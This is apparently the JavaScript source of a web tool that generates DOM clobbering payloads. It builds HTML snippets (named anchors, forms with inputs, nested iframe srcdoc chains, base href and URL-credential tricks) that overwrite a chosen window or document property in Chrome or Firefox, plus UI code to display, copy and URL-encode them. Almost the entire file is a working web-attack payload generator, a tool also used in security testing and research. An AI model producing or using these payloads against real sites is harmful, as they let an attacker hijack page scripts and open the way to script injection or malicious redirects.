let create_dom_clobbering_html_payload = function (statement) {
    let output = [];
    const clobbering_value = statement.clobbering_value;
    const code_targets = statement.clobbering_target.split('.');
    var html = ["a","abbr","acronym","address","applet","area","article","aside","audio","b","base","basefont","bdi","bdo","bgsound","big","blink","blockquote","body","br","button","canvas","caption","center","cite","code","col","colgroup","command","content","data","datalist","dd","del","details","dfn","dialog","dir","div","dl","dt","element","em","embed","fieldset","figcaption","figure","font","footer","form","frame","frameset","h1","head","header","hgroup","hr","html","i","iframe","image","img","input","ins","isindex","kbd","keygen","label","legend","li","link","listing","main","map","mark","marquee","menu","menuitem","meta","meter","multicol","nav","nextid","nobr","noembed","noframes","noscript","object","ol","optgroup","option","output","p","param","picture","plaintext","pre","progress","q","rb","rp","rt","rtc","ruby","s","samp","script","section","select","shadow","slot","small","source","spacer","span","strike","strong","style","sub","summary","sup","svg","table","tbody","td","template","textarea","tfoot","th","thead","time","title","tr","track","tt","u","ul","var","video","wbr","xmp"]
    var props=[];
    
    const chainIframes = function (clobbering_target, n) {
        if (clobbering_target.length - 2 === n) {
            return `<a id='${clobbering_target[n+1]}'${clobbering_value ? ` href='${clobbering_value}'` : ''}></a>`;
        }

        let html = `<iframe name=${clobbering_target[n+1]} srcdoc="${chainIframes(clobbering_target, n + 1)}"></iframe>`;

        if (n === 1) html = html.replace(/"/g, '&quot;');
        else if (n > 1) html = html.replace(/"/g, '&quot;').replace(/&/g, "&amp;");

        return html;
    };

    if (code_targets.length === 0) {
        return output;
    }


    if (code_targets[0] !== 'document') {


        if (code_targets[0] !== 'window') {
            
            code_targets.unshift('window'); // window will be there by default 
        }
        const code_targets_length = code_targets.length;

        if (code_targets_length === 1) {
            
            const payload = "Add something to clobber ";
            output.push(payload);
        } 
        
        
        else if (code_targets_length === 2) {
            // window.x 
            if(window.hasOwnProperty(code_targets[1])){
                output = output.concat([
                    `Cant clobber ${statement.clobbering_target}`
                ]);
            }
            
            else if(clobbering_value === ""){                        // in this Just clobbering  -> any tag with id works for window clobbering could add more 
                output = output.concat([
                    `<anytag id="${code_targets[1]}"> works basically`
                ]);

            }
            else{
                output = output.concat([
                    `${statement.clobbering_target} on toString() being called will return :  ${clobbering_value}`,
                    `<base href="x:"><a id="${code_targets[1]}" href="${clobbering_value}"></a>`,   
                    `<base href="x:"><area id="${code_targets[1]}" href="${clobbering_value}"></a>`
                ]);
            }

            


        } else if (code_targets_length === 3) {
            



			if(statement.clobbering_value === ""){
                output = output.concat([
					`Chrome: <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}"></a>`,
					`<form id="${code_targets[1]}"><input id="${code_targets[2]}"/> </form>`,
					`<form id="${code_targets[1]}"><button id="${code_targets[2]}"/> </form>`,
					`<form id="${code_targets[1]}"><img id="${code_targets[2]}" src="${clobbering_value}" /> </form>`,
					`<form name="${code_targets[1]}"><textarea name="${code_targets[2]}" /> </form>`,
				]);
            }

            else if(code_targets[2] === "username"){

				output = output.concat([
					`<a id="${code_targets[1]}" href="http://${clobbering_value}:random@random.com">`
				])
			}

			else if(code_targets[2] === "password"){
				output = output.concat([
					`<a id="${code_targets[1]}" href="http://random:${clobbering_value}@random.com">`
				])
			}
            else if(code_targets[2] === "host"){
				output = output.concat([
					`<a id="${code_targets[1]}" href="http://${clobbering_value}">`
				])
			}

			else{                
                for(i=0;i<html.length;i++){
                    obj = document.createElement(html[i]);
                    for(prop in obj) {

                        if(typeof obj[prop] === 'string' && prop === code_targets[2]) {

                            try {

                                props.push(html[i]+':'+prop);

                            }catch(e){

                            }

                        }
                    }
                }
                for(let i=0;i<props.length;i++){
                    let tag = props[i].split(":")[0]
                    let attribute = props[i].split(":")[1]
                    console.log(tag,attribute)
                    output.push(`<${tag} id="${code_targets[1]}" ${attribute}="${clobbering_value}" >`)
                }
            }

            if (output.length == 0 ){
                output.push(`Chrome:   <base href="x:"><a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}"></a>`)
            }


        } 


        else if(code_targets_length === 4){


                    if ( code_targets[3] === 'src') {


                        //  window.x.y.src
                        output = output.concat([
                            `<video id="${code_targets[1]}"></video><video id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}"></video>`,
                            `<audio id="${code_targets[1]}"></audio><audio id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}"></audio>`,
                            `<embed id="${code_targets[1]}"></embed><embed id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}"></embed>`,
                            `<form id="${code_targets[1]}"><img id="${code_targets[2]}" src="${clobbering_value}" /> </form>`,
                            `<form id="${code_targets[1]}"><object id="${code_targets[2]}" data="${clobbering_value}" /> </form>`,
                        ]);
                    } else if (code_targets[3] === 'value') {
                        //  window.x.y.value
                        output = output.concat([
                            `<form id="${code_targets[1]}"><input type="text" id="${code_targets[2]}" value="${clobbering_value}"/></form>`,
                            `<form id="${code_targets[1]}"><output id="${code_targets[2]}">${clobbering_value}</output></form>`,
                            `<form id="${code_targets[1]}"><textarea id="${code_targets[2]}" value="${clobbering_value}"/></form>`,
                            `<form id="${code_targets[1]}"><object id="${code_targets[2]}" value="${clobbering_value}" data="${clobbering_value}" /></form>`,
                        ]);
                    }  else if (code_targets[3] === 'username') {
                        //  window.x.y.username works only on chrome 
                        output = output.concat([
                            `Chrome : <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}:x@x.com"></a>`,
                        
                        ]);
                    
                    }else if (code_targets[3] === 'password') {
                        //  window.x.y.password works only on chrome 
                        output = output.concat([
                            `Chrome : <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="random:${clobbering_value}@x.com"></a>`,
                        
                        ]);
                    
                    }else if (code_targets[3] === 'host') {
                        //  window.x.y.host works only on chrome 
                        output = output.concat([
                            `Chrome : <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="x:x@${clobbering_value}"></a>`,
                        
                        ]);
                    
                    } else{            
                        //  window.x.y.z we need </form> for the form payload to become a HTML Collection!!
                        output = output.concat([
                            `Chrome : <form id="${code_targets[1]}">\n</form><form id="${code_targets[1]}" name="${code_targets[2]}">\n <input name="${code_targets[3]}" value="${clobbering_value}">\n</form>`,
                            `<base href="x:"><iframe name=${code_targets[1]} srcdoc="<iframe name=${code_targets[2]} srcdoc='<a id=${code_targets[3]} href=${clobbering_value}>'></iframe>"></iframe>`,
                        ]);
            
            
                    } 
        }
        
        
        else if (code_targets_length === 5) {
                    // window.x.y.z.w could add support for username and password host
                    let last_src_doc = `<a id=${code_targets[code_targets_length - 2]}></a><a id=${code_targets[code_targets_length - 2]} name=${code_targets[code_targets_length - 1]} href=${clobbering_value}></a>`;
                    let payload = `Chrome : <iframe name="${code_targets[1]}" srcdoc="<iframe name='${code_targets[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
                    output = output.concat([payload]);
        }
                
        else {
            // for higher levels, recursively chain iframes to create nested frames of length n
            let payload = chainIframes(code_targets, 0);
            output = output.concat([payload]);
        }
    }
    


    // Document Object clobbering




    else {
        const code_targets_length = code_targets.length;
        if (code_targets_length === 1) {
            // cannot clobber document object alone;
            const payload = "Warning: the global `document` object cannot be clobbered!";
            output = output.concat([payload]);
        } 
        else if(document.hasOwnProperty(code_targets[1])){
            const payload = `Warning: ${statement.clobbering_target} cannot be clobbered!`;
            output = output.concat([payload]);
        }

        else if (code_targets_length === 2) {
            // document.x
            output = output.concat([
                `<embed name="${code_targets[1]}" src="${clobbering_value}"></embed>`,
                `<img name="${code_targets[1]}" src="${clobbering_value}"></img>`,
                `<image name="${code_targets[1]}" src="${clobbering_value}"></img>`,
                `<object id="${code_targets[1]}" data="${clobbering_value}"></object>`,
                `<form name="${code_targets[1]}"></form>`,
                `Chrome : <iframe name="${code_targets[1]}"></iframe>`, // possilbe to do 
            ]);
        } else if (code_targets_length === 3) {
            // document.x.y
            output = output.concat([
                `<form name="${code_targets[1]}"></form> <form name="${code_targets[1]}" id="${code_targets[2]}"></form>`,
                `<form name="${code_targets[1]}"><img name="${code_targets[2]}" src="${clobbering_value}"></form>`,
                `<form name="${code_targets[1]}"><output name="${code_targets[2]}"> ${clobbering_value} </output></form>`,
                `<object id=${code_targets[1]}><img id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}" /></object>`,
            ]);
        } else if (code_targets_length === 4) {
            // document.x.y.z for name= attr should be used and needs </form> to become a HTML Collection
            output = output.concat([
                `<form name="${code_targets[1]}"></form><form name="${code_targets[1]}" id="${code_targets[2]}"><input name="${code_targets[3]}" value="${clobbering_value}"></form>`,
                `Chrome : ${chainIframes(code_targets, 0)}`,
            ]);
        } else {
            //  higher levels works only on chrome
            let payload = chainIframes(code_targets, 0);    
            output = output.concat([`Chrome : ${payload}`]);
        }
    }

    return output;
};




function sanitize(markup) {
    return markup.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function copyToClipboard(elem, copied_banner) {
    var range = document.createRange();
    range.selectNode(elem);
    window.getSelection().removeAllRanges(); // clear current selection
    window.getSelection().addRange(range); // to select text
    document.execCommand("copy");
    window.getSelection().removeAllRanges(); // to deselect

    $(copied_banner).show().animate({ top: -25, opacity: 0 }, 700, function () {
        $(this).css({ top: 0, opacity: 1 }).hide();
    });
}


const submit_button = document.getElementById('submit');
const results_container = document.getElementById('clobbering-result');

submit_button.addEventListener('click', (e) => {
    e.preventDefault();

    var clobbering_target = document.getElementById('clobbering-target').value.trim();
    var clobbering_value = document.getElementById('clobbering-value').value.trim();

    if (clobbering_target === '') {
        results_container.innerHTML = '<div class="alert alert-danger">Warning: DOM clobbering target is empty, please specify a target to clobber.</div>';
        return;
    }
    

    var outputs = create_dom_clobbering_html_payload({
        "clobbering_target": clobbering_target,
        "clobbering_value": clobbering_value
    });

    results_container.innerHTML = outputs.map((markup, idx) => {
        let sanitized = sanitize(markup);
        
        let isChrome = false;

        if (sanitized.startsWith("Chrome : ")) {
            sanitized = sanitized.replace("Chrome : ", "");
            isChrome = true;
        }
        
        return (`
        <section class="output">
            <div class="output-header">
                <div class="browsers">
                    <img class="chrome" src="https://c.animaapp.com/ro2F2Lav/img/chrome@2x.png" />
                    ${!isChrome ? '<img class="firefox" src="https://c.animaapp.com/ro2F2Lav/img/firefox@2x.png" />' : ''}
                </div>
                
                <div class="output-actions">
                <button class="action-btn encode-btn">
                    <img src="https://c.animaapp.com/vpz8jCvz/img/encode.svg" alt="Encode" />
                    <span>Encode</span>
                </button>
                <button class="action-btn copy-btn">
                    <img src="https://c.animaapp.com/vpz8jCvz/img/copy@2x.png" alt="Copy" />
                    <span>Copy</span>
                </button>
                </div>
            </div>
            <div class="output-content">
                <pre>
                    <code class="language-html">
                        ${sanitized.trim()}
                    </code>
                </pre>
            </div>
        </section>
        `)
    }).join('');

    document.querySelectorAll('pre code').forEach((block) => {
        hljs.highlightElement(block);
    });
});

$("#clobbering-result").on("click", ".copy-btn", function (e) {
    let outputContent = $(this).closest("section").find(".output-content").text();

    navigator.clipboard.writeText(outputContent);
});

$("#clobbering-result").on("click", ".encode-btn", function () {
    let outputContentElement = $(this).closest("section").find(".output-content");
    let originalText = outputContentElement.text().trim();
    
    let encodedText = encodeURIComponent(originalText);

    outputContentElement.text(encodedText);
    document.querySelectorAll('pre code').forEach((block) => {
        hljs.highlightElement(block);
    });
});
